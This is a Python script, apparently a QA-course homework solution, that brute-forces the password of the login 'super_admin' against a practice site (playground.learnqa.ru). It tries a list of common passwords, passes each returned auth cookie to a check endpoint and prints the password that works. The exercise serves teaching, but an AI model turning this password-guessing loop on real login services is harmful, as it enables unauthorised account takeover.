import requests
from colorama import Style, Fore
import time

class Info:
    """
    Итак, наша задача - написать скрипт и указать в нем login нашего коллеги и все пароли из Википедии в виде списка. Программа должна делать следующее:

    1. Брать очередной пароль и вместе с логином коллеги вызывать первый метод.
    В ответ метод будет возвращать авторизационную cookie с именем auth_cookie и каким-то значением.

    2. Далее эту cookie мы должна передать во второй метод check_auth_cookie. Если в ответ вернулась фраза "You are NOT authorized", значит пароль неправильный.
    В этом случае берем следующий пароль и все заново.
    Если же вернулась другая фраза - нужно, чтобы программа вывела верный пароль и эту фразу.
    """
    pass

print(Info.__doc__)
time.sleep(3)
print(Fore.YELLOW, '\n ПЕРЕБИРАЕМ!', Style.RESET_ALL)
time.sleep(1)

top_password_list = ['password', 'batman', '123456', '123456789', '12345678', '12345', 'qwerty', 'abc123', '1234567',
'monkey', '1234', 'football', 'Football', '1234567890', 'dragon', 'baseball', 'sunshine', 'iloveyou',
'trustno1', 'princess', 'qwerty', '111111', 'adobe123[a]', 'adobe123', 'photoshop', '123123', 'login', 'admin', 'qwerty123', 'solo', '1q2w3e4r',
'master', '666666', '1qaz2wsx', 'ashley', 'mustang', '121212', 'starwars', '654321', 'bailey', 'access', 'flower', '555555', 'passw0rd', 'shadow', 'lovely',
'letmein', '7777777', '!@#$%^&*', 'jesus', 'password1',	'superman', 'hello', 'charlie', '888888', 'michael', '696969',	'qwertyuiop',	'hottie',	'freedom', 'aa123456',
'qazwsx', 'ninja', 'azerty', 'loveme', 'whatever', 'donald', 'welcome', 'zaq1zaq1', '000000', '123qwe' ]

# Используем перебор паролей в цикле.
for i in range(0, len(top_password_list)):
    pass_count = top_password_list[i]
    values = {'login': 'super_admin', 'password': pass_count}

    # авторизация
    autch = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework', data = values )
    autch_cookies = dict(autch.cookies.items())
    print(Fore.BLUE, f'{autch_cookies} |', Style.RESET_ALL, end='')

    # проверка статуса авторизации
    check_auth_cookie = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies = autch_cookies)

    if 'You are authorized' in check_auth_cookie.text:
        print(Fore.GREEN, f'{check_auth_cookie.text} !!! / ', 'верный пароль найден: >', Style.RESET_ALL, end='')
        print(Fore.YELLOW, f'{pass_count}\n', Style.RESET_ALL)
    else:
        print(Fore.RED, check_auth_cookie.text, Style.RESET_ALL, end='')
        print(Fore.MAGENTA, f' / пароль > {pass_count} не верный\n', Style.RESET_ALL)



